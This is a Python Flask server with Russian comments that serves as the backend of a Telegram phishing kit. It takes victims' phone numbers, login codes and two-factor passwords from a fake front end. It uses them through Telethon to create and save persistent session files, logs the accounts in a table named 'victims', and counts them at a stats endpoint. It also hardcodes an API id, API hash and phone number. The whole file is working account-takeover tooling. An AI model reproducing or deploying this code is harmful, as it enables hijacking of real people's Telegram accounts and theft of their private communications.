from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import sqlite3
import os
import logging
from threading import Thread
import time
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Важно для работы с фронтендом!
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# База данных
def init_db():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (phone TEXT PRIMARY KEY, session_file TEXT, ref_id TEXT, 
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

async def create_telegram_session(phone, code, password, ref_id):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            if code:
                await client.sign_in(phone, code)
            elif password:
                await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                # Сохраняем сессию
                conn = sqlite3.connect('victims.db')
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO accounts (phone, session_file, ref_id) VALUES (?, ?, ?)", 
                         (phone, session_file, ref_id))
                conn.commit()
                conn.close()
                return True
                
    except SessionPasswordNeededError:
        if password:
            try:
                await client.sign_in(password=password)
                if await client.is_user_authorized():
                    conn = sqlite3.connect('victims.db')
                    c = conn.cursor()
                    c.execute("INSERT OR REPLACE INTO accounts (phone, session_file, ref_id) VALUES (?, ?, ?)", 
                             (phone, session_file, ref_id))
                    conn.commit()
                    conn.close()
                    return True
            except Exception as e:
                logging.error(f"Password error: {e}")
                return False
    except Exception as e:
        logging.error(f"Session error: {e}")
        return False
    
    return False

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.json
    phone = data.get('phone')
    ref_id = data.get('ref_id')
    
    # Имитируем отправку кода
    logging.info(f"Auth request for: {phone}")
    return jsonify({'status': 'code_sent'})

@app.route('/code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    ref_id = data.get('ref_id')
    
    logging.info(f"Code verification for: {phone}")
    success = run_async(create_telegram_session(phone, code, None, ref_id))
    
    if success:
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'password_required'})

@app.route('/password', methods=['POST'])
def verify_password():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    ref_id = data.get('ref_id')
    
    logging.info(f"Password verification for: {phone}")
    success = run_async(create_telegram_session(phone, None, password, ref_id))
    
    if success:
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'error'})

@app.route('/stats', methods=['GET'])
def get_stats():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM accounts")
    total = c.fetchone()[0]
    conn.close()
    return jsonify({'total_accounts': total})

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000, debug=True)
